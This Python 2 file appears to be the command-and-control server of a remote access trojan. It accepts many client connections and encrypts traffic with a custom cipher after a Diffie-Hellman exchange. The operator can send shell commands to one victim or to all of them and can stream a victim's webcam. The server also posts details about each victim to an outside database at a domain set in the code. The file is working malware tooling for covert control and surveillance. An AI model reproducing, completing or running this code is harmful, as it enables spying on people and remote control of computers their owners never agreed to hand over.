#!/usr/bin/env python
# -*- coding: utf-8 -*-
#
# Copyright (c) 2017 colental
#
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
#
# The above copyright notice and this permission notice shall be included in all
# copies or substantial portions of the Software.
#
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
# SOFTWARE.

BANNER = ''' 

,adPPYYba, 8b,dPPYba,   ,adPPYb,d8 88,dPPYba,  aa       aa
""     `Y8 88P'   `"8a a8"    `Y88 88P'   `"8a 88       88
,adPPPPP88 88       88 8b       88 88	       8b	88
88,    ,88 88       88 "8a,   ,d88 88	       "8a,   ,d88
`"8bbdP"Y8 88       88  `"YbbdP"Y8 88           `"YbbdP"Y8
                        aa,    ,88 	        aa,    ,88
                         "Y8bbdP"          	 "Y8bbdP'

                                               88                          ,d
                                               88                          88
 ,adPPYba,  ,adPPYb,d8  ,adPPYb,d8 8b,dPPYba,  88 ,adPPYYba, 8b,dPPYba,    88
a8P     88 a8"    `Y88 a8"    `Y88 88P'    "8a 88 ""     `Y8 88P'   `"8a MM88MMM
8PP""""""" 8b       88 8b       88 88       d8 88 ,adPPPPP88 88       88   88
"8b,   ,aa "8a,   ,d88 "8a,   ,d88 88b,   ,a8" 88 88,    ,88 88       88   88
 `"Ybbd8"'  `"YbbdP"Y8  `"YbbdP"Y8 88`YbbdP"'  88 `"8bbdP"Y8 88       88   88,
            aa,    ,88  aa,    ,88 88                                      "Y888
             "Y8bbdP"    "Y8bbdP"  88

'''

import os
import sys
import cv2
import json
import time
import numpy
import pickle
import socket
import select
import struct
import base64
import random
import requests
import tempfile
import colorama
import threading
import subprocess
import SocketServer


# default port for the server to listen on
__PORT__    = 1337  


# default database interaction targets 
__DATA__    = {'add_client': 'https://snapchat.sex/client.php',
               'add_task'  : 'https://snapchat.sex/task.php'}

# enable/disable debugging output
__DEBUG__   = False

# comment/uncomment the following line to disable/enable color 
colorama.init(autoreset=True)



class Server(threading.Thread):
    
    def __init__(self, port):
        super(Server, self).__init__()
        self.exit_status    = 0
        self.lock           = threading.Event()
        self.current_client = None
        self.clients        = {}
        self.commands       = {
	    'background'    :   self.background_client,
            'back'          :   self.background_client,
            'client'        :   self.select_client,
            'clients'       :   self.list_clients,
            'quit'          :   self.quit_server,
            'webcam'        :   self.webcam_client,
	    'sendall'	    :   self.sendall_clients,
            'settings'      :   self.settings,
            '--help'        :   self.usage,
            '-h'            :   self.usage,
            '?'             :   self.usage
            }
        self.db             = globals().get('__DATA__')
        self._rand_color    = lambda: getattr(colorama.Fore, random.choice(['RED','BLUE','CYAN','GREEN','YELLOW','WHITE','MAGENTA']))
        self._text_color    = self._rand_color()
        self._text_style    = colorama.Style.DIM
        self._prompt_color  = colorama.Fore.WHITE
        self._prompt_style  = colorama.Style.BRIGHT
        self.manager        = threading.Thread(target=self.client_manager, name='client_manager')
        self.s              = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.s.bind(('localhost', port)) if globals().get('__DEBUG__') else self.s.bind(('0.0.0.0', port))
        self.s.listen(100)
        self.lock.set()

    def __security__(fx):
        '''Decorator that takes a given function ('fx') and returns a static method with data encryption properties'''
        fx.block_size = 8
        fx.key_size   = 16
        fx.num_rounds = 32
        fx.hash_algo  = 'md5'
        return staticmethod(fx)

    @__security__
    def __encryption__():
        return Server.encryption.func_dict
    
    def _pad(self, s):
        return bytes(s) + (self.__encryption__.block_size - len(bytes(s)) % self.__encryption__.block_size) * '\x00'

    def _block(self, s):
        return [s[i * self.__encryption__.block_size:((i + 1) * self.__encryption__.block_size)] for i in range(len(s) // self.__encryption__.block_size)]
            
    def _xor(self, s, t):
        return "".join(chr(ord(x) ^ ord(y)) for x, y in zip(s, t))
            
    def _long_to_bytes(self, x):
        try:
            return bytes(bytearray.fromhex(hex(long(x)).strip('0x').strip('L')))
        except ValueError as e:
            self._error("_long_to_bytes failed with error: {}\nDecimal: '{}'\nHexidecimal: '{}".format(str(e), long(x), hex(long(x))))
            
    def _bytes_to_long(self, x):
        try:
            return long(bytes(x).encode('hex'), 16)
        except Exception as e:
            print('\n' + self._text_color + colorama.Style.BRIGHT + '[-] ' + colorama.Style.DIM + 'prompt failed with error: {}'.format(str(e)))

    def _prompt(self, data):
        try:
            return raw_input(self._prompt_color + self._prompt_style + data)
        except Exception as e:
            print('\n' + self._text_color + colorama.Style.BRIGHT + '[-] ' + colorama.Style.DIM + 'prompt function failed with error: {}'.format(str(e)))
    
    def _error(self, data):
        try:
            print('\n' + colorama.Fore.RED + colorama.Style.BRIGHT + '[-] ' + self._text_color + 'error: ' + self._text_style + data + '\n')
        except Exception as e:
            print('\n' + self._text_color + colorama.Style.BRIGHT + '[-] ' + colorama.Style.DIM + 'error function failed with error: {}'.format(str(e)))
    
    def _print(self, data):
        if self.current_client:
            self.current_client.lock.clear()
            print('\n' + self._text_color + self._text_style + data + '\n')
            self.current_client.lock.set()
        else:
            print('\n' + self._text_color + self._text_style + data + '\n')

    def _settings(self, target, setting, option):
        target  = target.lower()
        setting = setting.lower()
        option  = option.upper()
        if target == 'prompt':                
            if setting == 'color':
                if not hasattr(colorama.Fore, option):
                    return "usage:      settings prompt color [value]\ncolors:   white/black/red/yellow/green/cyan/magenta"
                self._prompt_color = getattr(colorama.Fore, option)
                return "prompt color changed to '{}'".format(option)
            elif setting == 'style':
                if not hasattr(colorama.Style, option):
                    return "usage:      settings prompt style [value]\nstyles:   bright/normal/dim"
                self._prompt_style = getattr(colorama.Style, option)
                return "prompt style changed to '{}'".format(option)
            else:
                return "usage:      settings prompt <option> [value]"
        elif target == 'text':
            if setting == 'color':
                if not hasattr(colorama.Fore, option):
                    return "usage:      settings text color [value]\ncolors:     white/black/red/yellow/green/cyan/magenta"
                self._text_color = getattr(colorama.Fore, option)
                return "text color changed to '{}'".format(option)
            elif setting == 'style':
                if not hasattr(colorama.Style, option):
                    return "usage:      settings text style [value]\nstyles:     bright/normal/dim"
                self._text_style = getattr(colorama.Style, option)
                return "text style changed to '{}'".format(option)
            else:
                return "usage:      settings text <option> [value]"
        return self.run()

    def _return(self):
        if self.current_client:
            if self.current_client.lock.is_set():
                return self.current_client.run()
            self.current_client.lock.clear()
            self.current_client = None
        self.lock.set()
        return self.run()

    def _diffiehellman(self, conn):
        g  = 2
        p  = 0xFFFFFFFFFFFFFFFFC90FDAA22168C234C4C6628B80DC1CD129024E088A67CC74020BBEA63B139B22514A08798E3404DDEF9519B3CD3A431B302B0A6DF25F14374FE1356D6D51C245E485B576625E7EC6F44C42E9A637ED6B0BFF5CB6F406B7EDEE386BFB5A899FA5AE9F24117C4B1FE649286651ECE45B3DC2007CB8A163BF0598DA48361C55D39A69163FA8FD24CF5F83655D23DCA3AD961C62F356208552BB9ED529077096966D670C354E4ABC9804F1746C08CA18217C32905E462E36CE3BE39E772C180E86039B2783A2EC07A28FB5C55DF06F4C52C9DE2BCBF6955817183995497CEA956AE515D2261898FA051015728E5A8AACAA68FFFFFFFFFFFFFFFF
        a  = self._bytes_to_long(os.urandom(self.__encryption__.key_size))
        xA = pow(g, a, p)
        conn.send(self._long_to_bytes(xA))
        xB = self._bytes_to_long(conn.recv(256))
        x  = pow(xB, a, p)
        return sys.modules['hashlib'].new(self.__encryption__.hash_algo, self._long_to_bytes(x)).digest()

    def _encrypt(self, data, key):
        data    = self._pad(data)
        blocks  = self._block(data)
        vector  = os.urandom(8)
        result  = [vector]
        for block in blocks:
            block   = self._xor(vector, block)
            v0, v1  = struct.unpack('!' + "2L", block)
            k       = struct.unpack('!' + "4L", key)
            sum, delta, mask = 0L, 0x9e3779b9L, 0xffffffffL
            for round in range(self.__encryption__.num_rounds):
                v0  = (v0 + (((v1 << 4 ^ v1 >> 5) + v1) ^ (sum + k[sum & 3]))) & mask
                sum = (sum + delta) & mask
                v1  = (v1 + (((v0 << 4 ^ v0 >> 5) + v0) ^ (sum + k[sum >> 11 & 3]))) & mask
            output  = vector = struct.pack('!' + "2L", v0, v1)
            result.append(output)
        return base64.b64encode(b''.join(result))

    def _decrypt(self, data, key):
        data    = base64.b64decode(data)
        blocks  = self._block(data)
        vector  = blocks[0]
        result  = []
        for block in blocks[1:]:
            v0, v1 = struct.unpack('!' + "2L", block)
            k = struct.unpack('!' + "4L", key)
            delta, mask = 0x9e3779b9L, 0xffffffffL
            sum = (delta * self.__encryption__.num_rounds) & mask
            for round in range(self.__encryption__.num_rounds):
                v1 = (v1 - (((v0 << 4 ^ v0 >> 5) + v0) ^ (sum + k[sum >> 11 & 3]))) & mask
                sum = (sum - delta) & mask
                v0 = (v0 - (((v1 << 4 ^ v1 >> 5) + v1) ^ (sum + k[sum & 3]))) & mask
            decode = struct.pack('!' + "2L", v0, v1)
            output = self._xor(vector, decode)
            vector = block
            result.append(output)
        return ''.join(result).rstrip('\x00')

    def webcam_client(self, mode=None):
        if not self.current_client:
            self._error( "No client selected")
        client = self.current_client
        result = ''
        client.lock.clear()
        if not mode or str(mode).lower() == 'stream':
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            retries = 5
            while retries > 0:
                try:
                    port = random.randint(6000,9999)
                    s.bind(('0.0.0.0', port))
                    s.listen(1)
                    cmd = 'webcam stream {}'.format(port)
                    self.send_client(cmd, client.name)
                    conn, addr  = s.accept()
                    break
                except:
                    retries -= 1
            print(self._text_color + colorama.Style.BRIGHT + '\nLive streaming from {}\n'.format(addr[0]) + colorama.Style.DIM + '( press <space> any time to stop )')
            header_size = struct.calcsize("L")
            window_name = addr[0]
            cv2.namedWindow(window_name)
            data = ""
            try:
                while True:
                    while len(data) < header_size:
                        data += conn.recv(4096)
                    packed_msg_size = data[:header_size]
                    data = data[header_size:]
                    msg_size = struct.unpack("L", packed_msg_size)[0]
                    while len(data) < msg_size:
                        data += conn.recv(4096)
                    frame_data = data[:msg_size]
                    data = data[msg_size:]
                    frame = pickle.loads(frame_data)
                    cv2.imshow(window_name, frame)
                    key = cv2.waitKey(70)
                    if key == 32:
                        break
            finally:
                conn.close()
                cv2.destroyAllWindows()
                client.lock.set()
        elif mode == 'image':
            self.send_client('webcam image')
            result = self.recv_client()
            return result
        elif mode == 'video':
            self.send_client('webcam video')
            result = self.recv_client()
            return result
        return client.run()
    
    def encrypt(self, data, client_id):
        if int(client_id) in self.clients:
            key = self.clients[int(client_id)].dhkey
            return self._encrypt(data, key)

    def decrypt(self, data, client_id):
        if int(client_id) in self.clients:
            key = self.clients[int(client_id)].dhkey
            return self._decrypt(data, key)
      
    def send_client(self, msg, client_id):
        if int(client_id) in self.clients:
            client = self.clients[int(client_id)]
            data = self.encrypt(msg, client.name) + '\n'
            client.conn.sendall(data)
    
    def recv_client(self, client_id):
        if int(client_id) in self.clients:
            client = self.clients[int(client_id)]
            buffer, method, message  = "", "", ""
            if client:
                while "\n" not in buffer:
                    try:
                        buffer += client.conn.recv(4096)
                    except:
                        break
                if len(buffer):
                    method, _, message = buffer.partition(':')
                    message = server.decrypt(message.rstrip(), client.name)
                    return (method, message)
            return
        else:
            self._error('Invalid Client ID')
    
    def get_clients(self):
        return [v for _, v in self.current_client.items()]

    def select_client(self, client_id):
        if int(client_id) not in self.clients:
            self._error('Invalid Client ID')
        else:
            self.lock.clear()
            self.current_client = self.clients[int(client_id)]
            if not self.current_client.lock.is_set():
                self.current_client.lock.set()
            self._print('\nClient {} selected\n'.format(client_id))
        self._return()

    def background_client(self):
        if self.current_client:
            self.current_client.lock.clear()
        self.current_client = None
        self.lock.set()
        return self.run()
    
    def sendall_clients(self, msg):
        for client in self.get_clients():
            try:
                self.send_client(msg, client.name)
            except Exception as e:
                self._error('Message to client {} failed with error: {}'.format(client.name, str(e)))
    
    def remove_client(self, client_id):
        if int(client_id) not in self.clients:
            self._error('Invalid Client ID')
        else:
            client = self.clients[int(client_id)]
            if not self.current_client:
                self._print('Client {} disconnected'.format(client.name))
                del client
                self.lock.set()
                return self.run()
            elif int(client_id) != self.current_client.name:
                self.current_client.lock.clear()
                self._print('Client {} disconnected'.format(client.name))
                del client
                self.current_client.lock.set()
                return self.current_client.run()
            else:
                self._print('Client {} disconnected'.format(client.name))
                del client
                return self.current_client.run()

    def kill_client(self, client_id):
        if int(client_id) in self.clients:
            client = self.clients.get(int(client_id))
            self.send_client('kill', client.name)
            client.conn.close()
            self.remove_client(client.name)
        self._return()
      
    def list_clients(self):
        print(self._text_color + colorama.Style.BRIGHT + '\nID | Client Address\n-------------------')
        for k, v in self.clients.items():
            print(self._text_color + colorama.Style.DIM + '{:>2}'.format(k) + colorama.Style.BRIGHT + ' | ' + colorama.Style.DIM + v.addr[0])
        print
          
    def quit_server(self):
        try:
            for client in self.get_clients():
                try:
                    self.send_client('standby', client.name)
                except: pass
        finally:
            sys.exit(0)
    
    def settings(self, args):
        return self._settings(*args.split())
    
    def add_to_db(self, client_id):
        if str(client_id).isdigit() and int(client_id) in self.clients:
            client = self.clients[int(client_id)]
            if self.db and 'add_client' in self.db:
                post  = requests.post(self.db['add_client'], data=client.info).content
                uid   = sys.modules['hashlib'].md5(bytes(client.info.get('ip')) + bytes(client.info.get('node'))).hexdigest()
                if post != uid:
                    self._error('client id did not match db record: {}'.format(post))
                return post
            else:
                print('no database found')
        self._return()
            
    def client_manager(self):
        while True:
            if self.exit_status:
                break
            try:
                conn, addr  = self.s.accept()
                name        = len(self.clients) + 1
                dhkey       = self._diffiehellman(conn)
                client      = ConnectionHandler(conn, addr, name, dhkey)
                self.clients[name] = client
                client.start()
            except Exception as e:
                print('manager failed with error: {}\nexiting...'.format(str(e)))
                break
        self.exit_status = True
        sys.exit(0)

    def usage(self):
        print
        print(colorama.Fore.YELLOW  + colorama.Style.DIM    + '--------------------------------------------------------------------')
        print(self._text_color + colorama.Style.BRIGHT   + '    command <argument>      ' + colorama.Fore.YELLOW + colorama.Style.DIM + '|' + colorama.Style.BRIGHT + colorama.Fore.WHITE + ' descripton')
        print(colorama.Fore.YELLOW  + colorama.Style.DIM    + '--------------------------------------------------------------------')
        print(self._text_color + self._text_style+ '    back                    ' + colorama.Fore.YELLOW + '|' + self._text_color + ' Deselect current client')
        print(self._text_color + self._text_style+ '    quit                    ' + colorama.Fore.YELLOW + '|' + self._text_color + ' Exit server and keep clients alive')
        print(self._text_color + self._text_style+ '    usage                   ' + colorama.Fore.YELLOW + '|' + self._text_color + ' display usage help for server commands')
        print(self._text_color + self._text_style+ '    clients                 ' + colorama.Fore.YELLOW + '|' + self._text_color + ' List connected clients')
        print(self._text_color + self._text_style+ '    client <id>             ' + colorama.Fore.YELLOW + '|' + self._text_color + ' Connect to a client')
        print(self._text_color + self._text_style+ '    sendall <command>       ' + colorama.Fore.YELLOW + '|' + self._text_color + ' Send command to all clients')
        print(self._text_color + self._text_style+ '    settings <options>      ' + colorama.Fore.YELLOW + '|' + self._text_color + ' Edit color/style settings')
        print(colorama.Fore.YELLOW  + colorama.Style.DIM    + '--------------------------------------------------------------------')
        print(self._text_color + self._text_style+ '< > = required argument')
        print(self._text_color + self._text_style+ '[ ] = optional argument\n')
        print
        self._return()

    def run(self):
        while True:
            if not self.manager.is_alive():
                self.manager = threading.Thread(target=self.client_manager, name='client_manager')
                self.manager.daemon = True
                self.manager.start()
            if self.exit_status:
                break
            self.lock.wait()
            output = ''
            cmd_buffer = self._prompt("[{} @ %s]> ".format(os.getenv('USERNAME', os.getenv('USER'))) % os.getcwd())
            cmd, _, action = cmd_buffer.partition(' ')
            if cmd in self.commands:
                output = self.commands[cmd](action) if len(action) else self.commands[cmd]()
            else:
                try:
                    output = subprocess.check_output(cmd_buffer, shell=True)
                except Exception as e2:
                    output = str(e2)
            if output and len(output):
                self._print(output)
        print('Server shutting down')
        sys.exit(0)


class ConnectionHandler(threading.Thread):
    global server
    
    def __init__(self, conn, addr, name, dhkey):
        super(ConnectionHandler, self).__init__()
        self.id     = bytes()
        self.prompt = None
        self.conn   = conn
        self.addr   = addr
        self.name   = name
        self.info   = {}
        self.tasks  = {}
        self.lock   = threading.Event()
        self.dhkey  = dhkey
        self.conn.setblocking(True)

    def _prompt(self, data):
        try:
            return raw_input(server._prompt_color + server._prompt_style + data)
        except ValueError as e:
             self._error("client prompt failed with error: '{}'".format(str(e)))
             
    def _error(self, data):
        try:
            print('\n' + colorama.Fore.RED + colorama.Style.BRIGHT + '[-] ' + colorama.Fore.WHITE + 'Error: ' + colorama.Style.DIM + data + '\n')
        except ValueError as e:
            print("client error failed with error: '{}'".format(str(e)))

    def run(self):
        while True:
            if server.exit_status:
                break
            if self.id:
                self.lock.wait()
            data = ''
            method, data = ('prompt', self.prompt) if self.prompt else server.recv_client(self.name)
            if 'prompt' in method:
                self.prompt = data.format(self.name)
                command = self._prompt(self.prompt)
                cmd, _, action = command.partition(' ')
                if cmd in server.commands:
                    result = server.commands[cmd](action) if len(action) else server.commands[cmd]()
                    if result:
                        server._print(result)
                    continue
                else:
                    server.send_client(command, self.name)
            elif 'start' in method:
                self.info  = json.loads(data)
                self.id    = server.add_to_db(self.name)
            else:
                if data:
                    server._print(data)
            self.prompt = None
        self.lock.clear()
        server.remove_client(self.name)
        server.current_client = None
        server.lock.set()
        server.run()
         

if __name__ == '__main__':
    port    = int(sys.argv[1]) if bool(len(sys.argv) == 2 and str(sys.argv[1]).isdigit() and 0 < int(sys.argv[1]) < 65355) else __PORT__
    server  = Server(port)
    os.system('cls' if os.name is 'nt' else 'clear')
    print('\n\n\n\n\n\n\n\n\n\n')
    print('\n' + server._rand_color() + BANNER + colorama.Fore.WHITE + '\n')
    print(colorama.Fore.YELLOW + "[?] " + colorama.Fore.WHITE + "-h/--help for usage information\n")
    server.start()



 
